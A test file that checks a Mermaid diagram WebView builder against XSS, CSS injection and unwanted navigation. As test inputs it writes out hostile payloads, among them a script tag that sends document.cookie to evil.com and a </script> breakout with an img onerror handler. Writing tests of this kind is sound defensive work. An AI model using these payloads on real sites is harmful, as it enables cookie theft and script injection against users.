import { describe, it, expect } from 'vitest';
import { buildMermaidWebViewHtml } from './buildMermaidWebViewHtml';
import { shouldAllowMermaidWebViewNavigation } from './mermaidWebViewPolicy';

describe('buildMermaidWebViewHtml — defends against WebView isolation WebView XSS', () => {
    it('embeds benign Mermaid source as a JS string literal (not HTML interpolation)', () => {
        const html = buildMermaidWebViewHtml({
            content: 'graph TD; A-->B',
            backgroundColor: '#1a1a1a',
        });
        // Source should appear inside a JS variable declaration with proper JSON quoting.
        // Note: we only need to escape `<` (the HTML parser cares about it inside <script>).
        // `>` and `-` are harmless inside a JS string — JSON.stringify doesn't escape them
        // and they can't break out of either the JS string or the HTML <script> tag.
        expect(html).toContain('var source = "graph TD; A-->B"');
        // Untrusted source must never appear as an HTML node.
        expect(html).not.toContain('<div id="mermaid-container">graph TD; A-->B</div>');
        // Container is created empty; SVG injected only via mermaid.render output.
        expect(html).toContain('<div id="mermaid-container"></div>');
    });

    it('neutralizes <script> tag injection — the canonical XSS payload', () => {
        const malicious = '<script>fetch("https://evil.com?c="+document.cookie)</script>';
        const html = buildMermaidWebViewHtml({
            content: malicious,
            backgroundColor: '#1a1a1a',
        });
        // Two LEGITIMATE <script> tags in our wrapper: <script src="...mermaid..."> + <script> for IIFE.
        // The injected <script>...</script> from the payload must NOT add a third one.
        const scriptOpenCount = (html.match(/<script[> ]/g) || []).length;
        expect(scriptOpenCount).toBe(2); // 1 CDN <script src= …> + 1 IIFE <script>; no injected third.
        expect(html).not.toContain('fetch("https://evil.com');
        // Verify the escaped form. JSON.stringify leaves `<` and `>` alone; our extra replace
        // pass only swaps `<` → < (the HTML-parser-relevant byte). `>` stays literal —
        // that's safe because once `<` is escaped, the HTML parser never sees `<script>`.
        expect(html).toContain('\\u003cscript>fetch');
    });

    it('neutralizes </script> closing-tag breakout — the JSON-in-HTML trap', () => {
        const malicious = 'graph TD\n</script><img src=x onerror=alert(1)>';
        const html = buildMermaidWebViewHtml({
            content: malicious,
            backgroundColor: '#1a1a1a',
        });
        // Two LEGITIMATE </script> tags in our wrapper. The injected </script> from the
        // payload must NOT add a third one — that would let an attacker break out of our
        // <script> block and inject arbitrary HTML afterward.
        const closingTagMatches = [...html.matchAll(/<\/script>/g)];
        expect(closingTagMatches.length).toBe(2); // CDN closer + IIFE closer; payload closer is escaped.
        // The escaped form preserves the bytes inside the JS string for mermaid.render to see.
        // Only `<` is escaped — `/script>` stays literal but that's fine because the HTML parser
        // looks for the LITERAL `</script>` byte sequence and `</script>` doesn't match it.
        expect(html).toContain('\\u003c/script>');
        // The <img onerror=...> attack vector that would have followed the breakout never
        // sees the HTML parser because it stays inside the escaped JS string.
        expect(html).not.toContain('<img src=x onerror=alert(1)>');
    });

    it('preserves legitimate Mermaid escape sequences (backslashes, quotes, newlines)', () => {
        const content = 'graph TD\n    A["He said \\"hi\\""] --> B';
        const html = buildMermaidWebViewHtml({
            content,
            backgroundColor: '#1a1a1a',
        });
        // The JSON-encoded form must round-trip through JSON.parse to recover the original content.
        // Extract the source = "..." line.
        const m = html.match(/var source = (".+?");$/m);
        expect(m).toBeTruthy();
        if (m) {
            const restored = JSON.parse(m[1].replace(/\\u003c/g, '<'));
            expect(restored).toBe(content);
        }
    });

    it('sanitizes the background color to color-only characters', () => {
        const html = buildMermaidWebViewHtml({
            content: 'graph TD; A-->B',
            // CSS injection attempt — try to break out and inject arbitrary CSS or JS.
            backgroundColor: '#1a1a1a; } body { background: url("javascript:alert(1)"); /*',
        });
        // The semicolons + braces + parens + javascript: should all be stripped or contained.
        expect(html).not.toContain('javascript:alert');
        expect(html).not.toContain('} body {');
    });

    it('falls back to #000000 for an entirely-rejected color string', () => {
        const html = buildMermaidWebViewHtml({
            content: 'graph TD; A-->B',
            backgroundColor: '!!!@@@$$$',
        });
        expect(html).toContain('background-color: #000000');
    });

    it('allows valid CSS color forms — hex, rgb(), rgba(), named, hsl()', () => {
        for (const color of ['#abc', '#aabbcc', 'rgb(10, 20, 30)', 'rgba(10, 20, 30, 0.5)', 'black', 'hsl(120, 50%, 50%)']) {
            const html = buildMermaidWebViewHtml({ content: 'graph TD; A-->B', backgroundColor: color });
            expect(html, `expected ${color} preserved`).toContain(`background-color: ${color}`);
        }
    });

    it('keeps mermaid securityLevel: strict (mermaid runtime XSS guard)', () => {
        // Belt-and-suspenders: mermaid v10+ has a built-in securityLevel option. Strict mode
        // sanitizes diagram-internal HTML/SVG before injection.
        const html = buildMermaidWebViewHtml({ content: 'graph TD; A-->B', backgroundColor: '#000' });
        expect(html).toContain("securityLevel: 'strict'");
    });

    it('pins and integrity-checks the CDN runtime', () => {
        const html = buildMermaidWebViewHtml({ content: 'graph TD; A-->B', backgroundColor: '#000' });
        expect(html).toContain('mermaid@11.16.0/dist/mermaid.min.js');
        expect(html).toContain('integrity="sha384-T/0lMUdJpd2S1ZHtRiofG3htU3xPCrFVeAQ1UUE2TJwlEJSV5NUwn30kP28n238E"');
        expect(html).not.toContain('mermaid@11/dist');
    });

    it('blocks diagram-controlled network, frame, form, and navigation sinks with CSP', () => {
        const html = buildMermaidWebViewHtml({ content: 'graph TD; A-->B', backgroundColor: '#000' });
        expect(html).toContain("default-src 'none'");
        expect(html).toContain("script-src 'unsafe-inline' https://cdn.jsdelivr.net/npm/mermaid@11.16.0/dist/mermaid.min.js");
        expect(html).toContain("img-src data:");
        expect(html).toContain("connect-src 'none'");
        expect(html).toContain("frame-src 'none'");
        expect(html).toContain("form-action 'none'");
        expect(html).toContain("base-uri 'none'");
    });

    it('allows only the local document navigation', () => {
        expect(shouldAllowMermaidWebViewNavigation('about:blank')).toBe(true);
        expect(shouldAllowMermaidWebViewNavigation('https://tracker.example/pixel')).toBe(false);
        expect(shouldAllowMermaidWebViewNavigation('http://tracker.example/pixel')).toBe(false);
        expect(shouldAllowMermaidWebViewNavigation('javascript:alert(1)')).toBe(false);
        expect(shouldAllowMermaidWebViewNavigation('file:///private/data')).toBe(false);
    });
});
